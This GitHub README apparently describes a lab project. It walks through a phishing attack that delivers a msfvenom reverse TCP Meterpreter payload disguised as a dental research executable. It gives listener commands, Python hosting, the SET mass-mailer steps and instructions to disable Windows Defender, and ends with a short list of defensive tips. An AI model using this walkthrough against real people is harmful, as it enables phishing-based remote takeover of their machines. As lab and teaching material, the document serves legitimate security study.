# <p align="center"> Payload-Deployment

## Introduction

In the ever-evolving landscape of cybersecurity, understanding and demonstrating the methods of payload deployment is crucial for both offensive and defensive strategies. This project delves into the intricate process of creating and deploying a reverse TCP payload using msfvenom, specifically within the context of a simulated social engineering attack. The objective is to illustrate the vulnerabilities that can be exploited through carefully crafted pretexts and technical methodologies.

<b>*Overview*</b>

The selected payload, a reverse TCP payload, is tailored for a scenario involving a fictitious dental research organization, "Advanced Dental Practice." This payload is designed to be embedded within an executable file named "AdvancedDentalResearchFindings.exe," which masquerades as a legitimate document pertinent to dental research. The primary aim is to gain remote access to a target machine, thereby exposing the susceptibilities that can be leveraged via social engineering tactics.

## Choice of Payload

- <b>*Payload Selection:*</b> A reverse TCP payload using msfvenom
- <b>*Objective:*</b> To achieve remote access to the target machine, demonstrating the vulnerabilites exploited through social engineering

## Emulation Setup

<b>*Lab Enviroment Configuration:*</b>

- <b>*Attackers VM:*</b> Set up Kali Linux VM to serve as the attacker's machine. This VM will be used for creating the payload with msfvenom, hosting it using the Python's HTTP server, and sending the phishing email via SET's Mass Email Attack feature.
- <b>*Target VM:*</b> Configure a Windows VM as the target for receiving the phishing email and accessing the payload.

<b>*NAT Network Configuration:*</b>

- Kali Linux (Attacker) and Windows (Target) VMs should be configured to use a NAT network. This setup allows the VMs to share the host machine's internet connection while isolating them from the host's network and each other. 

<b>*Disabling Windows Security Settings (for lab demonstration purpose):*</b>

- Turn off all security settings on the Windows target VM, including Windows Defender and any installed antivirus programs. This step is essential to allow the payload to execute without being blocked or flagged by the systems's security measures.
- Navigate to Windows Security settings and turn off features like real-time protection, cloud-delivered protection, and automatic sample submission to prevent the system from intercepting the payload.

<b>*Payload Hosting on Attacker VM:*</b>

- Host the "AdvancedDentalResearchFindings.exe" payload using Python's HTTP server.

  ```Python3 -m http.server 8000```

- The payload is now accessible through the attacker's VMs internal IP address on the NAT network.

<b>*Listener Setup on Attacker VM:*</b>

- Open msfvonsole on the Kali Linux VM and configure a listener for a reverse TCP connection

  ```Use exploit/multi/handler```

  ```Set payload windows/meterpreter/reverse_tcp```

  ```set lhost 192.168.100.4```

  ```set lport 5555```

  ```run```

- This configuration listens for the reverse TCP connection from the payload executed on the target machine.

<b>*Payload Delivery via SET:*</b>

- Use the Social Engineering ToolKit (SET) within Kali Linux VM to conduct a Mass Email Attack, sending a phishing email containing a link to the hosted payload ("AdvancedDentalResearchFindings.exe").
- The email being crafted aligns with the pretext scenario, making it appear to be legitimate communication related to dental research.

<b>*Execution on Target VM:*</b>

- The user on the Windows VM receives the phishing email.
- Upon clicking the link and executing the downladed file, the Windows VM initiates a reverse TCP connection to the Kali Linux VM.

## Step-by-Step Deployment

<b>*Payload creation with msfvenom*</b>

- Create the reverse TCP payload using msfvenom

![image](https://github.com/user-attachments/assets/db28f88c-9e8a-4091-8896-8b8c81cb053f)

<b>*Use Python to create HTTP server to host the payload*</b>

  ```python3 -m http.server```

![image](https://github.com/user-attachments/assets/b39598de-6982-4cdd-9dc7-d499bc3fdf2b)

<b>*Setup a listener using msfconsole*</b>

- Run msfconsole

![image](https://github.com/user-attachments/assets/32f8f230-be65-440f-be3b-3b1e02909c5e)

- Use exploit/multi/handler

![image](https://github.com/user-attachments/assets/161ad51c-7eba-4c47-b3be-11c383092789)

- Use show options command to display options required

![image](https://github.com/user-attachments/assets/e05025d2-2dd2-4b5f-9a08-821c345df4a3)

- Set payload windows/meterpreter/reverse_tcp

![image](https://github.com/user-attachments/assets/7fa0266e-2795-4861-b3d9-e9b5fea59708)

- Use show options command to display required payload options

![image](https://github.com/user-attachments/assets/f99d194d-01d4-4014-ae35-fa5a4c5e0ab3)

- Set lhost to 192.168.100.4 (Attacker VM IP)

![image](https://github.com/user-attachments/assets/1e526da2-e2e9-48de-af51-0a06c28808fe)

- Use show options to display updated payload options

![image](https://github.com/user-attachments/assets/12619530-91d2-436d-a7b2-1f77233ed87c)

- Set lport to 5555 (port used in the payload)

![image](https://github.com/user-attachments/assets/5198c3fd-054f-4f14-a1d4-200024dbb3ab)

- Use show options command to display updated payload options

![image](https://github.com/user-attachments/assets/070b75a2-d921-4aa0-b221-fe67bbfec109)

- Run the exploit

![image](https://github.com/user-attachments/assets/6ce6f577-cfef-4e2b-8c1b-e214f8a1a0b5)

<b>*Use The Social-Engineer Toolkit (SET) to send the payload to target*</b>

- Run SET and select option [1] Social-Engineering Attacks

![image](https://github.com/user-attachments/assets/55b2b942-90d1-49e1-80c8-1607c41e4d29)

- Select option [5] Mass Mailer Attack

![image](https://github.com/user-attachments/assets/38c5a430-e93b-4b60-9fc0-1d9bc7990399)

- Select option [1] E-Mail Attack Single Email Address

![image](https://github.com/user-attachments/assets/90c1448f-c2fd-4b5f-8215-cd1db24060a5)

- Select option [2] One-Time Use Email Template

![image](https://github.com/user-attachments/assets/910cbc5b-f806-40ad-8632-d284905290fa)

- Fill in all the information for the email

![SET 4](https://github.com/user-attachments/assets/a96734e0-5f68-4462-96d6-9b964e55c25b)

<b>*Target View*</b>

- Email inbox view of target

![image](https://github.com/user-attachments/assets/5a6756f8-e762-4cd3-86f6-0cf1d662f53f)

- Email view with payload attached

![target view 2](https://github.com/user-attachments/assets/0f7b9beb-88e0-4e87-b2f8-218edbe91cd6)

- Target view after clicking link

![image](https://github.com/user-attachments/assets/a335968e-5bfe-4580-be0f-fcab41256082)

- Pop up message displays when clicking the download file indicating that the file is harmful. For this demonstration, we will select keep

![image](https://github.com/user-attachments/assets/39c7b3e0-7c6e-4da5-b14e-e6ec1a2b50e5)

- Next select open file

![image](https://github.com/user-attachments/assets/bd204f1e-0e1c-4f79-a38e-d6e3c41f7ebe)

- Select Run

![image](https://github.com/user-attachments/assets/fe323814-f3ab-4bff-a360-48183f820d26)

<b>*Attacker View*</b>

- Check listner in msfconsole for reverse TCP successful connection

![image](https://github.com/user-attachments/assets/8760d7f6-c82a-4c6c-bbc9-35973bc87713)

## Preventative Measures

- <b>*Investigate Email Content and Sender:*</b> Be cautious of unsolicited emails, especially those with links or attachments. Verify the sender's credibility and be skeptical of unexpected requests or offers.
- <b>*Avoid Clicking Suspicious Links:*</b> Do not click on links in emails without verifying their authenticity. Hover over links to preview the URL and ensure it matches expected and known websites.
- <b>*Install and Maintain Antivirus Software:*</b> Ensure that reliable antivirus and anti-malware software is installed and updated on all devices.
- <b>*Implement Firewalls:*</b> Utilize network firewalls to block unauthorized access to your computer systems.
- <b>*Keep Systems Updated:*</b> Regularly update the operating system and all software, including browsers and email clients, to patch known vulnerabilities that could be exploited.
- <b>*Question Unexepected Requests:*</b> If an email asks for sensitive actions, like clicking a link or downloading a file, verify its legitimacy through alternative communication methods, such as calling the organization directly.
- <b>*Double-Check Before Downloading:*</b> Be cautious about downloading files from emails, especially executable files (.exe) or documents with embedded scripts. 

## Conclusion

This project provided parctical insights into alternative methods for payload delivery. Hosting the payload on a python server and then using a phishing email to link this payload demonstrated a versatile approach to overcoming email security barriers. Successfully configuring a NAT network for the VMs and intergrating various tools (msfvenom, python http server, SET, and msfconsole) displayed the complexity and adaptability required in successfully deploying a payload.
